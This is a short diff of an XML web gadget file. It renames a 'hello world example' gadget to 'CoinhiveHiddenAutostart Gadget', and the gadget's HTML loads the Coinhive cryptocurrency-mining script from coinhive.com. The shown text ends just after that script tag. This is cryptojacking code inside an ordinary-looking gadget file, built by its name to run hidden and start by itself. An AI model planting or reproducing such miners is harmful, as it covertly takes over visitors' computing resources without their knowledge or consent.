@@ -1,6 +1,6 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
 <Module>
-  <ModulePrefs title="hello world example" />
+  <ModulePrefs title="CoinhiveHiddenAutostart Gadget" />
   <Content type="html">
     <![CDATA[ 
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
